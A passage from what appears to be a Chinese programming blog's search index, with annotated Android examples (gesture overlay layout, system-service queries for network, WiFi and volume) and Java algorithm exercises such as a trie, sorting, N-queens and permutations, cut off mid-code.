android:padding=\u0026#34;16dp\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;android.gesture.GestureOverlayView android:fadeEnabled=\u0026#34;true\u0026#34; 启用淡出效果 android:fadeDuration=\u0026#34;1000\u0026#34; 淡出时间 android:gestureColor=\u0026#34;#ff0000\u0026#34; 笔画颜色 android:gestureStrokeWidth=\u0026#34;30\u0026#34; 笔画粗细 android:gestureStrokeType=\u0026#34;multiple\u0026#34; 设置为多笔画 android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:id=\u0026#34;@+id/gestureOverlayView\u0026#34;\u0026gt; \u0026lt;ImageView 包裹控件 android:background=\u0026#34;#3F51B5\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:id=\u0026#34;@+id/imageView\u0026#34;/\u0026gt; \u0026lt;/android.gesture.GestureOverlayView\u0026gt; \u0026lt;/LinearLayout\u0026gt; ","permalink":"https://xhstormr.github.io/blog/posts/android-gesturedetector/","summary":"","title":"Android 手势识别"},{"content":"Updated on 2016-10-17\nMainActivity.java public class MainActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE); 通过 getSystemService 获得 LayoutInflater 对象 View view = inflater.inflate(R.layout.activity_main, null); setContentView(view); } public void onClick(View view) { ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE); 管理网络连接 WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE); 管理 WIFI AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE); 管理音量 ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE); 管理运行中的 Activity switch (view.getId()) { case R.id.button1: NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo(); boolean isConnected = networkInfo != null \u0026amp;\u0026amp; networkInfo.isConnected(); Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;网络连接？：\u0026#34; + isConnected); true == 连接网络后（需等待一会） break; case R.id.button2: boolean isWifiEnabled = wifiManager.isWifiEnabled(); Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;WIFI状态？：\u0026#34; + isWifiEnabled); true == 打开 WIFI 后（需等待一会） break; case R.id.button3: int streamVolume = audioManager.getStreamVolume(AudioManager.STREAM_SYSTEM); 获取当前系统音量 int streamMaxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_SYSTEM); 获取最大系统音量 Log.w(\u0026#34;Tag\u0026#34;, streamVolume + \u0026#34;:\u0026#34; + streamMaxVolume); break; case R.id.button4: List\u0026lt;ActivityManager.RunningTaskInfo\u0026gt; runningTasks = activityManager.getRunningTasks(10); 获得当前正在运行的前 10 个应用（方法已被弃用） for (ActivityManager.RunningTaskInfo runningTask : runningTasks) { String packageName = runningTask.topActivity.getPackageName(); 应用包名 Log.w(\u0026#34;Tag\u0026#34;, packageName); } break; case R.id.toggleButton1: boolean isChecked = ((ToggleButton) view).isChecked(); boolean isSucceed = wifiManager.setWifiEnabled(isChecked); Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;打开WIFI？：\u0026#34; + isChecked + \u0026#34;，操作成功？：\u0026#34; + isSucceed); break; } } } activity_main.xml \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:padding=\u0026#34;16dp\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;网络是否连接\u0026#34; android:id=\u0026#34;@+id/button1\u0026#34;/\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;WIFI是否打开\u0026#34; android:id=\u0026#34;@+id/button2\u0026#34;/\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;获取系统音量\u0026#34; android:id=\u0026#34;@+id/button3\u0026#34;/\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;获取应用包名\u0026#34; android:id=\u0026#34;@+id/button4\u0026#34;/\u0026gt; \u0026lt;ToggleButton android:onClick=\u0026#34;onClick\u0026#34; android:textOn=\u0026#34;关闭WIFI\u0026#34; android:textOff=\u0026#34;开启WIFI\u0026#34; android:checked=\u0026#34;false\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:id=\u0026#34;@+id/toggleButton1\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; AndroidManifest.xml \u0026lt;uses-permission android:name=\u0026#34;android.permission.ACCESS_NETWORK_STATE\u0026#34;/\u0026gt; 获得网络状态 \u0026lt;uses-permission android:name=\u0026#34;android.permission.ACCESS_WIFI_STATE\u0026#34;/\u0026gt; 获得 WIFI 状态 \u0026lt;uses-permission android:name=\u0026#34;android.permission.CHANGE_WIFI_STATE\u0026#34;/\u0026gt; 改变 WIFI 状态 \u0026lt;uses-permission android:name=\u0026#34;android.permission.GET_TASKS\u0026#34;/\u0026gt; 获得应用运行列表（已被弃用） ","permalink":"https://xhstormr.github.io/blog/posts/android-systemservice/","summary":"","title":"Android 系统服务"},{"content":"Updated on 2016-12-16\nhttps://zh.wikipedia.org/zh-cn/数据结构\nhttps://zh.wikipedia.org/zh-cn/树_(数据结构)\nTrie 树（字典树） public class A { public static void main(String[] args) { final TrieNode root = new TrieNode(); 根节点 root.addStr(\u0026#34;babaab\u0026#34;); 添加字符串（字典） root.addStr(\u0026#34;babbbaaaa\u0026#34;); root.addStr(\u0026#34;abba\u0026#34;); root.addStr(\u0026#34;aaaaabaa\u0026#34;); root.addStr(\u0026#34;babaababb\u0026#34;); System.out.println(root.getStrCount(\u0026#34;babb\u0026#34;)); 返回以指定字符串开头的字典的个数 System.out.println(root.getStrCount(\u0026#34;baabaaa\u0026#34;)); System.out.println(root.getStrCount(\u0026#34;bab\u0026#34;)); System.out.println(root.getStrCount(\u0026#34;bb\u0026#34;)); System.out.println(root.getStrCount(\u0026#34;bbabbaab\u0026#34;)); } } class TrieNode { public final Map\u0026lt;Character, TrieNode\u0026gt; nextNodes = new HashMap\u0026lt;\u0026gt;(); 指向下一节点的引用 public char aChar; 该节点所代表的值 public int strCount; 该节点路径下所存在的单词个数 public boolean isStr; 该节点是否代表一个单词 public TrieNode() { 根节点构造方法 } public TrieNode(char aChar) { 子节点构造方法 this.aChar = aChar; this.strCount = 1; } public void addStr(String s) { String ➜ Stack ➜ 调用 addNode this.addNode(toCharStack(s)); } public int getStrCount(String s) { String ➜ Stack ➜ 调用 getNode TrieNode node = this.getNode(toCharStack(s)); return node.strCount; } private void addNode(Stack\u0026lt;Character\u0026gt; charStack) { if (charStack.empty()) { 空栈 isStr = true; 字符串结尾 } else { Character character = charStack.pop(); TrieNode node = nextNodes.get(character); if (node == null) { node = new TrieNode(character); 不存在，创建并放入 Map 中 nextNodes.put(node.aChar, node); } else { node.strCount++; 已存在，计数加一 } node.addNode(charStack); 递归调用 } } private TrieNode getNode(Stack\u0026lt;Character\u0026gt; charStack) { if (charStack.empty()) { 空栈 return this; 存在以此为开头的节点 } else { Character character = charStack.pop(); TrieNode node = nextNodes.get(character); if (node == null) { return new TrieNode(); 不存在以此为开头的节点，返回新建 TrieNode } else { return node.getNode(charStack); 递归调用 } } } private Stack\u0026lt;Character\u0026gt; toCharStack(String s) { 将字符串转为字符栈（String ➜ Stack） Stack\u0026lt;Character\u0026gt; charStack = new Stack\u0026lt;\u0026gt;(); char[] chars = s.toCharArray(); for (int i = chars.length - 1; i \u0026gt;= 0; i--) { 注意反向压入栈，确保字符串的开头为栈顶（先出栈） charStack.push(chars[i]); } return charStack; } } ---- 输出： 1 0 3 0 0 ","permalink":"https://xhstormr.github.io/blog/posts/java-data-structure/","summary":"","title":"Data Structure"},{"content":"Updated on 2017-07-13\nhttps://visualgo.net/zh\nhttps://cpbook.net/#downloads\nhttps://www.cs.usfca.edu/~galles/visualization/Algorithms.html\nhttp://panthema.net/2013/sound-of-sorting/\n算法是解决问题的清晰指令，是用系统的方法描述解决问题的策略机制。\n冒泡排序 通过交换相邻数据来达到排序目的。\npublic class A { public static void main(String[] args) { int[] ints = new int[10]; for (int i = 0; i \u0026lt; ints.length; i++) { ints[i] = ((int) (Math.random() * 100)); } System.out.println(Arrays.toString(ints)); 排序之前 b(ints); System.out.println(Arrays.toString(ints)); 排序之后 } private static void a(int[] ints) { 原始算法 int temp; for (int i = 0; i \u0026lt; ints.length - 1; i++) { 循环 9 次 for (int j = 0; j \u0026lt; ints.length - 1; j++) { 比较 9 次 if (ints[j] \u0026gt; ints[j + 1]) { 交换 temp = ints[j]; ints[j] = ints[j + 1]; ints[j + 1] = temp; } } System.out.println(i + 1 + \u0026#34;➜\u0026#34; + Arrays.toString(ints)); } } private static void b(int[] ints) { 优化后 int temp; boolean changed; for (int i = 0; i \u0026lt; ints.length - 1; i++) { changed = false; for (int j = 0; j \u0026lt; ints.length - 1 - i; j++) { 不再比较经过排序后的高位 if (ints[j] \u0026gt; ints[j + 1]) { temp = ints[j]; ints[j] = ints[j + 1]; ints[j + 1] = temp; changed = true; } } if (!changed) { break; 未变动，排序完成，跳出循环 } System.out.println(i + 1 + \u0026#34;➜\u0026#34; + Arrays.toString(ints)); } } } ---- 输出： [35, 19, 97, 56, 24, 45, 41, 47, 37, 53] 1➜[19, 35, 56, 24, 45, 41, 47, 37, 53, 97] 2➜[19, 35, 24, 45, 41, 47, 37, 53, 56, 97] 3➜[19, 24, 35, 41, 45, 37, 47, 53, 56, 97] 4➜[19, 24, 35, 41, 37, 45, 47, 53, 56, 97] 5➜[19, 24, 35, 37, 41, 45, 47, 53, 56, 97] [19, 24, 35, 37, 41, 45, 47, 53, 56, 97] 排序方向：从右至左 选择排序 每次从数组中选取最小值来排列。\npublic class A { public static void main(String[] args) { List\u0026lt;Integer\u0026gt; list = Arrays.asList(0, 1, 2, 3, 4, 5, 6, 7, 8, 9); 数组 ➜ 集合 Collections.shuffle(list); 打乱 Integer[] ints = list.toArray(new Integer[0]); 集合 ➜ 数组 System.out.println(Arrays.toString(ints)); 排序之前 a(ints); System.out.println(Arrays.toString(ints)); 排序之后 } private static void a(Integer[] ints) { int temp; int index; for (int i = 0; i \u0026lt; ints.length - 1; i++) { 循环 9 次 index = i; for (int j = i + 1; j \u0026lt; ints.length; j++) { 寻找最小列 if (ints[j] \u0026lt; ints[index]) { index = j; } } if (index != i) { 交换 temp = ints[i]; ints[i] = ints[index]; ints[index] = temp; } System.out.println(i + 1 + \u0026#34;➜\u0026#34; + Arrays.toString(ints)); } } } ---- 输出： [5, 9, 1, 4, 8, 7, 2, 6, 0, 3] 1➜[0, 9, 1, 4, 8, 7, 2, 6, 5, 3] 2➜[0, 1, 9, 4, 8, 7, 2, 6, 5, 3] 3➜[0, 1, 2, 4, 8, 7, 9, 6, 5, 3] 4➜[0, 1, 2, 3, 8, 7, 9, 6, 5, 4] 5➜[0, 1, 2, 3, 4, 7, 9, 6, 5, 8] 6➜[0, 1, 2, 3, 4, 5, 9, 6, 7, 8] 7➜[0, 1, 2, 3, 4, 5, 6, 9, 7, 8] 8➜[0, 1, 2, 3, 4, 5, 6, 7, 9, 8] 9➜[0, 1, 2, 3, 4, 5, 6, 7, 8, 9] [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] 排序方向：从左至右 快速排序 分区 + 递归\npublic class Main { private static void qSort(int[] arr, int head, int tail) { if (head \u0026gt;= tail || arr == null || arr.length \u0026lt;= 1) { return; } int i = head; int j = tail; int k = arr[(head + tail) / 2]; while (true) { while (arr[i] \u0026lt; k) { i++; } while (arr[j] \u0026gt; k) { j--; } if (i \u0026lt; j) { swap(arr, i, j); i++; j--; } else if (i == j) { // arr[i]=arr[j]=k i++; // 步进 1 -\u0026gt; 跳出循环 } else { break; } } qSort(arr, head, j); qSort(arr, i, tail); } private static void swap(int[] arr, int i, int j) { // 交换位置 int temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; } public static void main(String[] args) { int[] arr = {1, 4, 8, 2, 55, 3, 4, 8, 6, 90, 0, 11, 34, 4, 23, 54, 77, 9, 2, 10, 4, 9}; qSort(arr, 0, arr.length - 1); System.out.println(java.util.Arrays.toString(arr)); } } 数字矩形 public class A { public static void main(String[] args) { a(9); } private static void a(int n) { int[][] ints = new int[n][n]; int x = 0, y = 0; int number = 1; while (true) { while (x \u0026lt; n \u0026amp;\u0026amp; ints[y][x] == 0) { ints[y][x] = number++; x++; } b(ints); y++; x--; while (y \u0026lt; n \u0026amp;\u0026amp; ints[y][x] == 0) { ints[y][x] = number++; y++; } b(ints); y--; x--; while (x \u0026gt;= 0 \u0026amp;\u0026amp; ints[y][x] == 0) { ints[y][x] = number++; x--; } b(ints); y--; x++; while (y \u0026gt;= 0 \u0026amp;\u0026amp; ints[y][x] == 0) { ints[y][x] = number++; y--; } b(ints); y++; x++; if (number \u0026gt; n * n) { break; } } b(ints); } private static void b(int[][] ints) { for (int[] ints2 : ints) { for (int i : ints2) { System.out.print(i + \u0026#34;\\t\u0026#34;); } System.out.println(); } System.out.println(\u0026#34;----------------------\u0026#34;); } } public class B { public static void main(String[] args) { a(9); } private static void a(int n) { int[][] ints = new int[n][n]; int x = 0, y = 0; int number = 1; ints[y][x] = number++; while (true) { if (x \u0026lt; n - 1 \u0026amp;\u0026amp; y \u0026lt; n - 1) { y++; ints[y][x] = number++; b(ints); y--; x++; while (y \u0026gt;= 0) { ints[y][x] = number++; y--; x++; } b(ints); y++; while (x \u0026gt;= 0) { ints[y][x] = number++; y++; x--; } b(ints); y--; x++; } else { x++; while (x \u0026lt; n) { ints[y][x] = number++; x++; y--; } x--; y++; y++; while (y \u0026lt; n) { ints[y][x] = number++; x--; y++; } x++; y--; b(ints); } if (number \u0026gt; n * n) { break; } } b(ints); } private static void b(int[][] ints) { for (int[] ints2 : ints) { for (int i : ints2) { System.out.print(i + \u0026#34;\\t\u0026#34;); } System.out.println(); } System.out.println(\u0026#34;----------------------\u0026#34;); } } 使用位运算实现加减乘 public class A { public static void main(String[] args) { int x = 456; int y = 789; System.out.println(x + y); System.out.println(x - y); System.out.println(x * 3); System.out.println(\u0026#34;—————————\u0026#34;); System.out.println(a(x, y)); System.out.println(b(x, y)); System.out.println(c(x, 3)); } private static int a(int x, int y) { 加（关键） int i; while (((x \u0026amp; y) != 0)) { 有进位 i = x ^ y; y = (x \u0026amp; y) \u0026lt;\u0026lt; 1; x = i; } i = x | y; 无进位 return i; } private static int b(int x, int y) { 减（加负数） y = a(~y, 1); 转为负数（补码） return a(x, y); } private static int c(int x, int i) { 乘（加多次） int sum = 0; for (int j = 0; j \u0026lt; i; j++) { sum = a(sum, x); } return sum; } } ---- 输出： 1245 -333 1368 ————————— 1245 -333 1368 ------------------------------------------------------- public class Test { public static void main(String[] args) { a(); b(); c(); } private static void a() { 有进位（一次） int x = 1; 0001 int y = 1; 0001 int i = (x \u0026amp; y) \u0026lt;\u0026lt; 1; 0010 System.out.println(i); } private static void b() { 无进位 int x = 2; 0010 int y = 1; 0001 int i = x | y; 0011 System.out.println(i); } private static void c() { 有进位（二次） int x = 3; 0011 int y = 1; 0001 int i; while (((x \u0026amp; y) != 0)) { 有进位 i = x ^ y; y = (x \u0026amp; y) \u0026lt;\u0026lt; 1; x = i; } i = x | y; 无进位 System.out.println(i); 0100 } } ---- 输出： 2 3 4 PS：除法最后没实现，因为解决不了小数点的问题。 Beautiful String public class A { private static boolean isFirst = true; private static boolean isBeautiful = true; private static int count; private static int i; public static void main(String[] args) { a(\u0026#34;abc\u0026#34;); a(\u0026#34;aaab\u0026#34;); a(\u0026#34;abccde\u0026#34;); a(\u0026#34;abb\u0026#34;); } private static void a(String s) { s.chars().forEach(value -\u0026gt; { if (isBeautiful) { if (isFirst) { isFirst = false; i = value; count = 1; } else { if (i != value) { count++; i++; if (i != value) { isBeautiful = false; } } } } }); if (isBeautiful \u0026amp;\u0026amp; count \u0026gt;= 3) { System.out.println(\u0026#34;YES\u0026#34;); } else { System.out.println(\u0026#34;NO\u0026#34;); } isFirst = true; isBeautiful = true; } } ---- 输出： YES NO YES NO 一个数的平方数的末三位等于其本身 public class A { public static void main(String[] args) { int i = 0; int count = 0; while (true) { i++; if (i == getInt(i)) { count++; System.out.println(i); } if (count == 3) { break; } } } private static int getInt(int i) { return (i * i) % 1000; } } ---- 输出： 1 376 625 N 皇后（八皇后） import java.util.Scanner; public class Main { private static int[] ints;//下标为行，值为对应列 private static int count;//解法数 public static void main(String[] args) { ints = new int[new Scanner(System.in).nextInt()]; queen(0); System.out.println(\u0026#34;共 \u0026#34; + count + \u0026#34; 种\u0026#34;); } /** * 递归放置皇后。 * * @param k 当前放置行。 */ private static void queen(int k) { if (k \u0026gt; ints.length - 1) {//所有行都已经放置完毕，解法数加一 count++; show(); } else { for (int i = 0; i \u0026lt; ints.length; i++) {//遍历测试行的每一列 ints[k] = i; if (place(k)) { queen(k + 1);//当前行的行列位置可以放置皇后，递归前往下一行 } } } } /** * 判断当前行的行列位置是否可以放置皇后（与之前的皇后是否冲突）。 * * @param k 当前放置行。 * @return true 为可以放置，false 反之。 */ private static boolean place(int k) { for (int j = 0; j \u0026lt; k; j++) {//遍历之前的行与其进行比较 if (ints[j] == ints[k] || Math.abs(ints[j] - ints[k]) == Math.abs(j - k)) {//皇后不能为同列，同对角线 return false; } } return true; } /** * 显示摆法。 */ private static void show() { for (int i : ints) { for (int j = 0; j \u0026lt; ints.length; j++) { if (j == i) { System.out.print(\u0026#34;● \u0026#34;);//皇后 } else { System.out.print(\u0026#34;○ \u0026#34;); } } System.out.println(); } System.out.println(\u0026#34;——————————————————\u0026#34;); } } 2N 皇后 import java.util.Scanner; public class Main { private static int[][] ints;//棋盘 private static int[] b;//下标为行，值为对应列 private static int[] w;//下标为行，值为对应列 private static int count;//解法数 public static void main(String[] args) { Scanner scanner = new Scanner(System.in); int i = scanner.nextInt(); ints = new int[i][i]; b = new int[i]; w = new int[i]; for (int m = 0; m \u0026lt; i; m++) { for (int n = 0; n \u0026lt; i; n++) { if (scanner.nextInt() == 0) { ints[m][n] = -1; } } } queen(0, true);//开始放置白皇后 System.out.println(count); } /** * 递归放置皇后。 * * @param k 当前放置行。 */ private static void queen(int k, boolean who) { if (k \u0026gt; ints.length - 1) {//所有行都已经放置完毕，解法数加一 count++; } else { for (int i = 0; i \u0026lt; ints.length; i++) {//遍历测试行的每一列 if (who) { w[k] = i; } else { b[k] = i; } if (place(k, who)) { if (who \u0026amp;\u0026amp; k + 1 \u0026gt; ints.length - 1) {//白皇后的所有行都已经放置完毕，开始放置黑皇后 queen(0, false); } else { queen(k + 1, who);//当前行的行列位置可以放置皇后，递归前往下一行 } } } } } /** * 判断当前行的行列位置是否可以放置皇后（与之前的皇后是否冲突）。 * * @param k 当前放置行。 * @return true 为可以放置，false 反之。 */ private static boolean place(int k, boolean who) { if (who) { if (ints[k][w[k]] == -1) { return false; } } else { if (ints[k][b[k]] == -1 || w[k] == b[k]) { return false; } } for (int j = 0; j \u0026lt; k; j++) {//遍历之前的行与其进行比较 if (who) { if (w[j] == w[k] || Math.abs(w[j] - w[k]) == Math.abs(j - k)) {//皇后不能为同列，同对角线 return false; } } else { if (b[j] == b[k] || Math.abs(b[j] - b[k]) == Math.abs(j - k)) {//皇后不能为同列，同对角线 return false; } } } return true; } } 组合算法 public class Main { private static int[] ints = {1, 2, 3, 4};//数据 private static int[] temp = new int[3];//放法 private static int count;//放法数 public static void main(String[] args) { combination(0, temp.length, temp); System.out.printf(\u0026#34;C %d %d 共 %d 种\\n\u0026#34;, ints.length, temp.length, count); } private static void combination(int i, int n, int[] temp) {//动态规划 if (n == 0) { count++; show(); return; } if (i == ints.length) { return; } temp[n - 1] = ints[i]; combination(i + 1, n - 1, temp); combination(i + 1, n, temp); } /** * 显示放法。 */ private static void show() { for (int i = temp.length - 1; i \u0026gt;= 0; i--) { System.out.print(temp[i] + \u0026#34; \u0026#34;); } System.out.println(); } } ---- 输出： 1 2 3 1 2 4 1 3 4 2 3 4 C 4 3 共 4 种 排列算法（全排列） import java.util.Arrays; import java.util.Scanner; public class Main { private static int[] ints;//放法 private static int count;//放法数 public static void main(String[] args) { ints = new int[new Scanner(System.in).nextInt()]; permutation(0); System.out.printf(\u0026#34;A %d %d 共 %d 种\\n\u0026#34;, ints.length, ints.length, count); } /** * 递归放置元素。 * * @param k 当前索引位置。 */ private static void permutation(int k) { if (k \u0026gt; ints.length - 1) {//所有索引位置（元素）都已经放置完毕，放法数加一 count++; show(); } else { for (int i = 0; i \u0026lt; ints.length; i++) {//测试当前索引位置，遍历放置每一个元素 ints[k] = i; if (place(k)) { permutation(k + 1);//当前索引位置的元素可以放置，递归前往下一个索引位置 } } } } /** * 判断当前索引位置的元素与之前索引位置的元素是否冲突（重复）。 * * @param k 当前索引位置。 * @return true 为可以放置，false 反之。 */ private static boolean place(int k) { for (int j = 0; j \u0026lt; k; j++) {//遍历之前的索引位置与其进行比较 if (ints[j] == ints[k]) {//元素不能重复 return false; } } return true; } /** * 显示放法。 */ private static void show() { System.out.println(Arrays.toString(ints)); } } ---- 输入： 3 输出： [0, 1, 2] [0, 2, 1] [1, 0, 2] [1, 2, 0] [2, 0, 1] [2, 1, 0] A 3 3 共 6 种 排列组合算法 public class Main { private static int[] ints = {1, 2, 3, 4};//数据 private static int[] temp = new int[3];//放法 private static int count;//放法数 private static boolean flag = true;//排列：true；组合：false public static void main(String[] args) { a(0); System.out.printf(\u0026#34;%s %d %d 共 %d 种\\n\u0026#34;, flag ? \u0026#34;A\u0026#34; : \u0026#34;C\u0026#34;, ints.length, temp.length, count); } /** * 递归放置元素。 * * @param k 当前索引位置。 */ private static void a(int k) { if (k \u0026gt; temp.length - 1) {//所有索引位置（元素）都已经放置完毕，放法数加一 count++; show(); } else { for (int i = 0; i \u0026lt; ints.length; i++) {//测试当前索引位置，遍历放置每一个元素 temp[k] = i; if (place(k)) { a(k + 1);//当前索引位置的元素可以放置，递归前往下一个索引位置 } } } } /** * 判断当前索引位置的元素与之前索引位置的元素是否冲突。 * * @param k 当前索引位置。 * @return true 为可以放置，false 反之。 */ private static boolean place(int k) { for (int j = 0; j \u0026lt; k; j++) {//遍历之前的索引位置与其进行比较 if (flag ? temp[j] == temp[k] : temp[j] \u0026gt;= temp[k]) {//排列：元素索引不能重复；组合：元素索引只能递增 return false; } } return true; } /** * 显示放法。 */ private static void show() { for (int i : temp) { System.out.print(ints[i] + \u0026#34; \u0026#34;); } System.out.println(); } } 凑算式 暴力解法 ---- public class Main { public static void main(String[] args) { int count = 0; for (double a = 1; a \u0026lt;= 9; a++) { for (double b = 1; b \u0026lt;= 9; b++) { if (b != a) { for (double c = 1; c \u0026lt;= 9; c++) { if (c != b \u0026amp;\u0026amp; c != a) { for (double d = 1; d \u0026lt;= 9; d++) { if (d != c \u0026amp;\u0026amp; d != b \u0026amp;\u0026amp; d != a) { for (double e = 1; e \u0026lt;= 9; e++) { if (e != d \u0026amp;\u0026amp; e != c \u0026amp;\u0026amp; e != b \u0026amp;\u0026amp; e != a) { for (double f = 1; f \u0026lt;= 9; f++) { if (f != e \u0026amp;\u0026amp; f != d \u0026amp;\u0026amp; f != c \u0026amp;\u0026amp; f != b \u0026amp;\u0026amp; f != a) { for (double g = 1; g \u0026lt;= 9; g++) { if (g != f \u0026amp;\u0026amp; g != e \u0026amp;\u0026amp; g != d \u0026amp;\u0026amp; g != c \u0026amp;\u0026amp; g != b \u0026amp;\u0026amp; g != a) { for (double h = 1; h \u0026lt;= 9; h++) { if (h != g \u0026amp;\u0026amp; h != f \u0026amp;\u0026amp; h != e \u0026amp;\u0026amp; h != d \u0026amp;\u0026amp; h != c \u0026amp;\u0026amp; h != b \u0026amp;\u0026amp; h != a) { for (double i = 1; i \u0026lt;= 9; i++) { if (i != h \u0026amp;\u0026amp; i != g \u0026amp;\u0026amp; i != f \u0026amp;\u0026amp; i != e \u0026amp;\u0026amp; i != d \u0026amp;\u0026amp; i != c \u0026amp;\u0026amp; i != b \u0026amp;\u0026amp; i != a) { // double d1 = new BigDecimal(b / (double) c).setScale(4, BigDecimal.ROUND_HALF_UP).doubleValue(); // double d2 = new BigDecimal((d * 100 + e * 10 + f) / (double) (g * 100 + h * 10 + i)).setScale(4, BigDecimal.ROUND_HALF_UP).doubleValue(); // double m = a + d1 + d2; double m = a + b / c + (d * 100 + e * 10 + f) / (g * 100 + h * 10 + i); if (m == 10) { count++; } } } } } } } } } } } } } } } } } } System.out.println(count); } } ---- 输出： 29 ------------------------------------------------------- 使用全排列后： public class Main { private static int[] ints = new int[9]; private static int count; public static void main(String[] args) { permutation(0); System.out.println(count); } private static void permutation(int k) { if (k \u0026gt; ints.length - 1) { suitable(); } else { for (int i = 0; i \u0026lt; ints.length; i++) { ints[k] = i; if (place(k)) { permutation(k + 1); } } } } private static boolean place(int k) { for (int j = 0; j \u0026lt; k; j++) { if (ints[j] == ints[k]) { return false; } } return true; } private static void suitable() { double a = ints[0] + 1; double b = ints[1] + 1; double c = ints[2] + 1; double d = ints[3] + 1; double e = ints[4] + 1; double f = ints[5] + 1; double g = ints[6] + 1; double h = ints[7] + 1; double i = ints[8] + 1; double m = a + b / c + (d * 100 + e * 10 + f) / (g * 100 + h * 10 + i); if (m == 10) { // System.out.println(Arrays.toString(ints)); count++; } } } 百钱买百鸡 import java.util.Arrays; public class Main { // ints[0] 公鸡数量 // ints[1] 母鸡数量 // ints[2] 小鸡数量 private static int[] ints = new int[3]; public static void main(String[] args) { permutation(0); } private static void permutation(int k) { if (k \u0026gt; ints.length - 1) { suitable(); } else { for (int i = 0; i \u0026lt;= 100; i++) { ints[k] = i; permutation(k + 1); } } } private static void suitable() { if (ints[2] % 3 == 0 \u0026amp;\u0026amp; ints[0] + ints[1] + ints[2] == 100 \u0026amp;\u0026amp; ints[0] * 5 + ints[1] * 3 + ints[2] / 3 == 100) { System.out.println(Arrays.toString(ints)); } } } ---- 输出： [0, 25, 75] [4, 18, 78] [8, 11, 81] [12, 4, 84] 1 到 16 分出两组数字使其和、平方和、立方和都相等 public class Main { private static int[] ints = new int[7]; 每组肯定都是 8 个数字，只需求出包含 1 的那一组数字 private static int a, b, c; public static void main(String[] args) { for (int i = 1; i \u0026lt;= 16; i++) { a += i; 和 b += i * i; 平方和 c += i * i * i; 立方和 } a /= 2; 一个组的和 b /= 2; 一个组的平方和 c /= 2; 一个组的立方和 a(0); } private static void a(int k) { if (k \u0026gt; ints.length - 1) { c(); } else { for (int i = 2; i \u0026lt;= 16; i++) { 枚举 2 到 16 ints[k] = i; if (b(k)) { a(k + 1); } } } } private static boolean b(int k) { for (int j = 0; j \u0026lt; k; j++) { if (ints[j] == ints[k]) { return false; } } return true; } private static void c() { int temp = 1; for (int i : ints) { temp += i; } if (temp != a) { return; 和不等 } temp = 1; for (int i : ints) { temp += i * i; } if (temp != b) { return; 平方和不等 } temp = 1; for (int i : ints) { temp += i * i * i; } if (temp != c) { return; 立方和不等 } System.out.print(1 + \u0026#34; \u0026#34;); for (int i : ints) { System.out.print(i + \u0026#34; \u0026#34;); } System.exit(0); 结束程序 } } ---- 输出： 1 4 6 7 10 11 13 16 猜算式 public class Main { private static int[] ints; public static void main(String[] args) { for (int x = 100; x \u0026lt;= 999; x++) { for (int y = 100; y \u0026lt;= 999; y++) { ints = new int[10]; int a = x * (y / 1 % 10); int b = x * (y / 10 % 10); int c = x * (y / 100 % 10); if (a \u0026gt;= 100 \u0026amp;\u0026amp; a \u0026lt; 1000 \u0026amp;\u0026amp; b \u0026gt;= 100 \u0026amp;\u0026amp; b \u0026lt; 1000 \u0026amp;\u0026amp; c \u0026gt;= 100 \u0026amp;\u0026amp; c \u0026lt; 1000 \u0026amp;\u0026amp; x * y \u0026gt;= 10000 \u0026amp;\u0026amp; x * y \u0026lt; 100000 \u0026amp;\u0026amp; check(x) \u0026amp;\u0026amp; check(y) \u0026amp;\u0026amp; check(a) \u0026amp;\u0026amp; check(b) \u0026amp;\u0026amp; check(c) \u0026amp;\u0026amp; check(x * y)) { System.out.println(x + \u0026#34; \u0026#34; + y + \u0026#34; \u0026#34; + a + \u0026#34; \u0026#34; + b + \u0026#34; \u0026#34; + c + \u0026#34; \u0026#34; + x * y); } } } } private static boolean check(int i) { for (; i != 0; i /= 10) { int j = i % 10; ints[j]++; if (ints[j] == 3) { return false; } } return true; } } ---- 输出： 179 224 716 358 358 40096 ------------------------------------------------------- public class Main { private static int[] ints; public static void main(String[] args) { a(100); } private static void a(int x) { if (x \u0026gt; 999) { return; } else { for (int y = 100; y \u0026lt;= 999; y++) { ints = new int[10]; int a = x * (y / 1 % 10); int b = x * (y / 10 % 10); int c = x * (y / 100 % 10); if (a \u0026gt;= 100 \u0026amp;\u0026amp; a \u0026lt; 1000 \u0026amp;\u0026amp; b \u0026gt;= 100 \u0026amp;\u0026amp; b \u0026lt; 1000 